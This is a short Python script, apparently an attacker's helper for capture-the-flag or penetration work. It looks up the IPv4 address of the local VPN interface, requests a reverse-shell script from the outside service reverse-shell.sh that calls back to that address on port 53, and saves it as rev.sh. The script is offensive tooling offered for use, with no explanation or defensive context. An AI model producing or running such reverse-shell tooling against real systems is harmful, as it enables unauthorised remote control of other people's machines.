import requests
import os
import netifaces

def get_tun0_ip():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if interface == 'utun3':
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                ipv4_addresses = addresses[netifaces.AF_INET]
                if len(ipv4_addresses) > 0:
                    return ipv4_addresses[0]['addr']
    return None

# Example usage
TUN0_IP = get_tun0_ip()
PORT = 53

url = f"https://reverse-shell.sh/{TUN0_IP}:{PORT}"
response = requests.get(url)

if response.status_code == 200:
    # Get the response text
    response_text = response.text
    
    # Write the response text to a file named rev.sh
    with open('rev.sh', 'w') as file:
        file.write(response_text)
        
    print("File rev.sh created and written successfully.")
else:
    print("HTTP request failed.")
